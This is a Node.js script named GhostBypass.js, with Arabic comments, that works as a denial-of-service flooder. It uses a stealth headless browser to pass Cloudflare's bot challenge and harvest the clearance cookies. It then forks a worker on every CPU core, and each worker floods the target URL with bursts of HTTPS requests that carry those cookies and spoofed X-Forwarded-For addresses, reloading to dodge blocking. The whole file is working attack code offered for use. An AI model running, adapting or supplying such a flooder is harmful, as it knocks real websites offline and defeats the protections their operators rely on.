const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const cluster = require('cluster');
const os = require('os');
const https = require('https');
const randomstring = require("randomstring");

puppeteer.use(StealthPlugin());

if (process.argv.length <= 3) {
    console.log("Usage: node GhostBypass.js <url> <time>");
    process.exit(-1);
}

const targetUrl = process.argv[2];
const duration = parseInt(process.argv[3]);

if (cluster.isMaster) {
    const cores = os.cpus().length;
    console.log(`[!] LAUNCHING GHOST BYPASS... SNEAKING THROUGH CLOUDFLARE ON ${cores} CORES...`);
    for (let i = 0; i < cores; i++) cluster.fork();
    setTimeout(() => process.exit(), duration * 1000);
} else {
    const executeGhostAttack = async () => {
        const browser = await puppeteer.launch({
            headless: "new", 
            args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-web-security']
        });

        const page = await browser.newPage();
        
        // محاكاة بصمة متصفح حقيقية (Viewport, UserAgent)
        await page.setViewport({ width: 1920, height: 1080 });
        
        while (true) {
            try {
                // 1. الدخول للموقع وانتظار Cloudflare حتى يحلل المتصفح
                await page.goto(targetUrl, { waitUntil: 'networkidle2', timeout: 60000 });
                
                // استخراج الكوكيز التي تؤكد تجاوز الحماية (cf_clearance)
                const cookies = await page.cookies();
                const cookieString = cookies.map(c => `${c.name}=${c.value}`).join('; ');
                const userAgent = await page.evaluate(() => navigator.userAgent);

                // 2. إطلاق هجوم Flood خارجي باستخدام الكوكيز "الشرعية" التي استخرجناها
                const attackFlood = async () => {
                    for (let i = 0; i < 200; i++) {
                        const ip = `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
                        const options = {
                            hostname: targetUrl.replace('https://', '').replace('http://', '').split('/')[0],
                            path: '/',
                            headers: {
                                'User-Agent': userAgent,
                                'Cookie': cookieString,
                                'X-Forwarded-For': ip,
                                'Connection': 'keep-alive'
                            }
                        };
                        const req = https.request(options);
                        req.end();
                    }
                };

                await attackFlood();
                
                // انتظار بسيط ثم إعادة تحديث الكوكيز لتجنب الحظر بالنمط
                await new Promise(r => setTimeout(r, 5000));
                await page.reload({ waitUntil: 'networkidle2' });
                
            } catch (e) {
                // في حال تم اكتشاف البوت، نعيد المحاولة بتغيير الجلسة
                await page.reload();
            }
        }
    };
    executeGhostAttack();
}

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});